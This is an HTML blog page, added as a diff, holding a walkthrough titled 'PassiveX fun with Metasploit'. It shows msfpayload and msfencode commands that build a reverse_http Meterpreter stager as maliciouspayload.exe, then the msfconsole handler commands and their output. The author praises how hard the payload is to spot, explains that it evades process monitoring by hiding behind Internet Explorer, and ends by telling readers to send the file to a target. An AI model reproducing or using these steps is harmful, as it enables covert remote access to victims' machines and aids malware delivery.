@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>PassiveX fun with Metasploit</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the <a href="/archives/440-metasploit-2.html">IExpress “hack”</a> would make for an very hard to spot payload.</p>
+
+<p>A really down and dirty explination of what PassiveX is and why it&rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).</p>
+
+<p>(props to skape for writting PassiveX and @<a href="http://twitter.com/_natron_"><em>natron</em></a> for kicking in the latest tweaks to make it work with IE7/IE8)</p>
+
+<p><strong>Here are the options for msfpayload:</strong></p>
+
+<p>Usage: ./msfpayload <payload> [var=val] <S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA></p>
+
+<p><strong>And msfencode&rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):</strong></p>
+
+<p>./msfencode -h</p>
+
+<p>Usage: ./msfencode <options></p>
+
+<p>OPTIONS:</p>
+
+<p>-a <opt> The architecture to encode as<br />
+-b <opt> The list of characters to avoid: &lsquo;x00xff&rsquo;<br />
+-c <opt> The number of times to encode the data<br />
+-e <opt> The encoder to use<br />
+-h Help banner<br />
+-i <opt> Encode the contents of the supplied file path<br />
+-l List available encoders<br />
+-m <opt> Specifies an additional module search path<br />
+-n Dump encoder information<br />
+-o <opt> The output file<br />
+-s <opt> The maximum size of the encoded data<br />
+-t <opt> The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)</p>
+
+<p><strong>Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:</strong></p>
+
+<p>./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe</p>
+
+<p>[*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)</p>
+
+<p><strong>Now that we have our &ldquo;malicious payload&rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):</strong></p>
+
+<p>./msfconsole</p>
+
+<p>_<br />
+| | o<br />
+_ _ _ _ <em>|</em> <strong>, , _ | | __ <em>|</em><br />
+/ |/ |/ | |/ | / | / <em>|/ _|/ / _| |<br />
+| | |</em>/|</strong>/|<em>/</em>/|<em>/ / |<strong>/ |</strong>/__/ |</em>/|_/<br />
+/|<br />
+|</p>
+
+<p>=[ msf v3.3-dev<br />
++ &ndash; &ndash;=[ 376 exploits - 234 payloads<br />
++ &ndash; &ndash;=[ 20 encoders - 7 nops<br />
+=[ 153 aux</p>
+
+<p>msf &gt; use multi/handler<br />
+msf exploit(handler) &gt; exploit -h</p>
+
+<p><strong>(I&rsquo;m showing you &lsquo;exploit&rsquo;s options because a lot of people don&rsquo;t know they exist. With two lines you can start your listener (use, then exploit):</strong></p>
+
+<p>Usage: exploit [options]<br />
+Launches an exploitation attempt.</p>
+
+<p>OPTIONS:<br />
+-e <opt> The payload encoder to use. If none is specified, ENCODER is used.<br />
+-h Help banner.<br />
+-j Run in the context of a job.<br />
+-n <opt> The NOP generator to use. If none is specified, NOP is used.<br />
+-o <opt> A comma separated list of options in VAR=VAL format.<br />
+-p <opt> The payload to use. If none is specified, PAYLOAD is used.<br />
+-t <opt> The target index to use. If none is specified, TARGET is used.<br />
+-z Do not interact with the session after successful exploitation.</p>
+
+<p>msf exploit(handler) &gt; exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False</p>
+
+<p>[<em>] Exploit running as background job.<br />
+[</em>] PassiveX listener started.<br />
+[*] Starting the payload handler&hellip;</p>
+
+<p>msf exploit(handler) &gt;</p>
+
+<p><strong>Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you&rsquo;re set.</strong></p>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
